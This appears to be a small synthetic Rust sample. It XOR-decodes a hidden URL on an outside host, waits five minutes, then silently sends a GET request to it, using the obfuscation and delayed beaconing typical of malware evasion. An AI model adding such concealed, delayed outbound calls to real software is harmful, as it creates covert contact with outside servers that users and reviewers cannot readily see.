use std::time::Duration;

fn dec(input: &str) -> String {
    let input_bytes = input.as_bytes();
    let output_bytes: Vec<u8> = input_bytes.iter().map(|&b| b ^ 42).collect();

    return String::from_utf8(output_bytes).expect("Invalid utf-8 sequence, moron");
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let enc_url = "B^^ZY\x10\x05\x05X_YYCKD\x07HE^\x04DO^";

    tokio::time::sleep(Duration::from_secs(300)).await;

    let url = dec(enc_url);
    let _ = reqwest::get(url).await;

    Ok(())
}
